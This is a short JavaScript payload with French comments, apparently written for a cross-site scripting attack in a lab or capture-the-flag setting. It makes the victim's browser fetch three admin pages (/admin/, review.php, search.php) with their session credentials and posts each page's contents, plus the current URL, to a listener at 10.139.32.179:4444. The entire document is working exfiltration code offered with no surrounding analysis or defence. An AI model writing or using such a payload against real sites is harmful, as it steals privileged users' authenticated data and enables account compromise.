const listener = "http://10.139.32.179:4444";

// Simple fetch pour chaque page
fetch("/admin/", { credentials: "include" })
    .then(r => r.text())
    .then(t => fetch(listener + "/admin", { mode:"no-cors", body: t }));

fetch("/admin/review.php", { credentials: "include" })
    .then(r => r.text())
    .then(t => fetch(listener + "/review", { mode:"no-cors", body: t }));

fetch("/admin/search.php", { credentials: "include" })
    .then(r => r.text())
    .then(t => fetch(listener + "/search", { mode:"no-cors", body: t }));

// Fallback: envoyer la page actuelle
fetch(listener + "/current", { mode:"no-cors", body: location.href });
